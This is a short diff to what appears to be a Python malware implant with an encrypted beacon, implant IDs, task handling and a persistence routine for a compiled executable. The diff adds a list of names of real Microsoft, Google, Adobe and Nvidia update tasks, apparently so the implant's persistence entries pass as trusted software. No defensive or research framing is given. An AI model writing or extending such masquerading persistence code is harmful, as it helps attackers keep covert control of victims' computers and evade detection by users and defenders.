@@ -70,6 +70,15 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
 ]
+
+# Legitimate persistence names
+LEGIT_PERSISTENCE_NAMES = [
+    "OneDriveStandaloneUpdater",
+    "MicrosoftEdgeUpdateTaskMachine",
+    "GoogleUpdateTaskMachineCore", 
+    "AdobeUpdateService",
+    "NvidiaTelemetryContainer",
+]
 # ================================================
 
 aesgcm = AESGCM(BEACON_KEY)
@@ -108,6 +117,7 @@ def generate_implant_id():
         return str(uuid.uuid4())
         
 def establish_persistence():
+    global LEGIT_PERSISTENCE_NAMES
     """Multi-method persistence for compiled exe"""
     
     # Get current executable path
@@ -1420,6 +1430,7 @@ def handle_task(task):
 if __name__ == "__main__":
     import sys
     main()
+
 
 
 
